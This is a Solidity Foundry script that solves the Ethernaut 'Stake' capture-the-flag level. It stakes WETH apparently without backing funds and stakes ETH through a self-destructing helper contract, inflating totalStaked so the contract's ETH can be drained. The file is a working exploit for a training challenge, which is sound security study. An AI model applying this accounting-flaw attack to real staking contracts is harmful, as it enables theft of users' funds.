// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Level} from "ethernaut/levels/base/Level.sol";
import {Vm, console, Attacker} from "../src/Attacker.sol";
import {Stake} from "../src/Stake.sol";
import {ERC20} from "@openzeppelin/token/ERC20/ERC20.sol";

/**
 *
 * Level address: 0xB99f27b94fCc8b9b6fF88e29E1741422DFC06224
 * Stake is safe for staking native ETH and ERC20 WETH, considering the same 1:1
 * value of the tokens. Can you drain the contract?
 *
 * To complete this level, the contract state must meet the following
 * conditions:
 *
 * The Stake contract's ETH balance has to be greater than 0.
 * totalStaked must be greater than the Stake contract's ETH balance.
 * You must be a staker.
 * Your staked balance must be 0.
 * Things that might be useful:
 *
 * ERC-20 specification.
 * OpenZeppelin contracts
 */
contract Pawn {
    constructor(Stake stake, ERC20 weth) payable {
        weth.approve(address(stake), type(uint256).max);
        stake.StakeETH{value: 0.001 ether + 1 wei}();
        stake.Unstake(0.001 ether);
        stake.StakeWETH(1 ether);
        selfdestruct(payable(msg.sender));
    }
}

contract StakeScript is Attacker {
    Level private level = Level(0xB99f27b94fCc8b9b6fF88e29E1741422DFC06224);

    function run() external {
        vm.startBroadcast(me.privateKey);
        address instance = getNewLevelInstance(level);
        Stake stake = Stake(instance);
        ERC20 weth = ERC20(stake.WETH());

        weth.approve(address(stake), type(uint256).max);
        stake.StakeWETH(1 ether);
        stake.Unstake(1 ether);
        Pawn pawn =
            new Pawn{value: 0.001 ether + 1 wei}(stake, ERC20(stake.WETH()));

        require(
            address(stake).balance > 0
                && stake.totalStaked() > address(stake).balance
                && stake.Stakers(me.addr) && stake.UserStake(me.addr) == 0,
            "Level not complete"
        );
        require(submitInstance(), "Level submission failed");
        vm.stopBroadcast();
    }
}
